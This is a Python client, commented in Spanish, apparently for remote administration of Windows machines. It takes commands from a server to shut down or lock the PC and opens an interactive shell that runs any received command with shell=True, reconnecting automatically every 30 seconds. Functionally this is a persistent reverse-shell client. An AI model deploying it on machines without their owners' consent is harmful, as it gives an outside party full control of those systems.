import socket
import json
import threading
import os
import subprocess
import time
from clases.cliente import cliente_socket

global salida
salida = False
BASE_DIR = os.getcwd()

#Función de dos hilos que corren en el programa
def manejar_canal_cliente():
    global salida

    while True:
        try:
            print('Manejar canal de cliente')
            respuesta_servidor = cliente_socket.get_socket_cliente().recv(cliente_socket.HEADER).decode(cliente_socket.FORMAT)
            print('Se recibio mensaje vacio del servidor')
            if respuesta_servidor == ' ':
                cliente_socket.get_socket_cliente().send(' '.encode())
                print('Se envió mensaje vacio')
            else:
                try:
                    print(f'Instrucción a aplicar {respuesta_servidor}')

                    if respuesta_servidor == 'apagar':
                        cliente_socket.get_socket_cliente().send(json.dumps({'success': True, 'msg': 'Apagado realizado exitosamente'}).encode())
                        os.system(f'{BASE_DIR}/comandos/{respuesta_servidor}.bat')

                    elif respuesta_servidor == 'bloquear':
                        cliente_socket.get_socket_cliente().send(json.dumps({'success': True, 'msg': 'Bloqueo de windows realizado exitosamente'}).encode())
                        print(f'{os.getcwd()}/comandos/{respuesta_servidor}.bat')
                        os.system(f'{BASE_DIR}/comandos/{respuesta_servidor}.bat')

                    elif respuesta_servidor == 'desbloquear':
                        cliente_socket.get_socket_cliente().send(json.dumps({'success': True, 'msg': 'Bloqueo de windows realizado exitosamente'}).encode())
                        os.system(f'{BASE_DIR}/comandos/{respuesta_servidor}.bat')

                    elif respuesta_servidor == 'consola':
                        print('Abrir consola')
                        current_wd = f'{os.getcwd()}>'
                        cliente_socket.get_socket_cliente().send(json.dumps({'success': True, 'consola': current_wd}).encode())

                        manejar_comandos_consola()
                        print('Salir de manejar comandos')

                    else:
                        print('Instruccion no encontrada')

                except:
                    mensaje_respuesta = json.dumps({'success': False, 'msg': 'Hubo un error al ejecutar la instrucción mandada'})
                    print(mensaje_respuesta)
                    cliente_socket.get_socket_cliente().send(mensaje_respuesta.encode())

        except (socket.error, socket.timeout) as err:
            #SE HACE LA ESEPCIÓN DE QUE SI SE VA EL INTERNET
            if isinstance(err, (socket.error, socket.timeout)):
                print('Desconexión de internet del canal principal')
                cliente_socket.get_socket_cliente().close()
                cliente_socket.get_socket_cliente_secundario().close()
                #CREAR UNA FUNCIÓN DE RECONEXIÓN TODO
                salida = True
                break
            else:
                print('Ocurrió un error en el canal cliente principal')
                cliente_socket.get_socket_cliente().close()
                cliente_socket.get_socket_cliente_secundario().close()
                salida = True
                break

#Función que permite al servidor saber si el cliente sigue activo
def manejar_canal_cliente_secundario():
    print('Manejar canal de cliente secundario')
    cliente_socket.get_socket_cliente_secundario().settimeout(2)
    while True:
        try:
            mensaje = cliente_socket.get_socket_cliente_secundario().recv(cliente_socket.HEADER).decode(cliente_socket.FORMAT)
            # print(f'Mensaje del servidor {mensaje}')
            cliente_socket.get_socket_cliente_secundario().send('*'.encode())
            
        except:
            print('Ocurrio un error en el canal cliente secunadrio')
            cliente_socket.get_socket_cliente().close()
            cliente_socket.get_socket_cliente_secundario().close()
            global salida
            salida = True
            break

#Función que maneja los comandos de la consola con respecto al administrador
def manejar_comandos_consola():
    while True:
        try:
            comando = cliente_socket.get_socket_cliente().recv(cliente_socket.HEADER).decode(cliente_socket.FORMAT)
            print(f'Operación a realizar {comando}')
            if comando == 'salir':
                print('Dentro del if de salir')
                break

            if comando[:2] == 'cd':
                try:
                    os.chdir(comando[3:])
                except: 
                    print('comando cd no reconocido')

            if len(comando) > 0:
                cmd = subprocess.Popen(comando[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = output_bytes.decode(cliente_socket.FORMAT, errors='ignore')
                current_wd = f'{os.getcwd()}>'
                cliente_socket.get_socket_cliente().send(str.encode(output_str + current_wd))

        except:
            print('Ocurrio en la función de manejar comandos en la consola')
            break

def observar_salida():
    global salida
    print(f'PRINT DE SALIDA {salida}')
    while True:
        if salida:
            print('SALIDA')
            salida = False
            realizar_conexion()
            break

#Función para verificar la conexión a internet de la misma
def verificar_conexion_internet():
    try:
        # Attempt to connect to a well-known website
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False

#Función principal
def main():
    respuesta = cliente_socket.crear_sockets()
    if respuesta['success']:
        print(respuesta)
        respuesta = cliente_socket.conexion_temporal()
        if respuesta['success']:
            print(respuesta)
            respuesta = cliente_socket.validacion_conexion()
            if respuesta['success']:
                print(respuesta)
                
                #Conexión con el canal secundario despúes de la validación del socket principal
                respuesta = cliente_socket.conexion_canal_secundario()
                print(respuesta)

                if respuesta['success']:
                    print('Conexión con canal secundario exitosa ;3')

                    #Abrir los dos procesos que van a estar corriendo al mismo tiempo
                    cliente_thread = threading.Thread(target=manejar_canal_cliente)
                    cliente_thread.start()
                    cliente_secundario_thread = threading.Thread(target=manejar_canal_cliente_secundario)
                    cliente_secundario_thread.start()

                    #Función en el hilo principal para observar si ha habido un fallo y realizar función de desconexión
                    observar_salida() 
                else: 
                    print('Hubo un error al conectar con el canal secundario')
                    time.sleep(30)
                    realizar_conexion()

    print(respuesta['msg'])
    print('Reconectando con servidor en 30 segundos...')
    time.sleep(30)
    realizar_conexion()      

#Realizar conexión la primera vez
def realizar_conexion():
    if verificar_conexion_internet():
        main()
    else:
        print('Intentando reconexión en 30 segundos...')
        time.sleep(30)
        realizar_conexion()

realizar_conexion()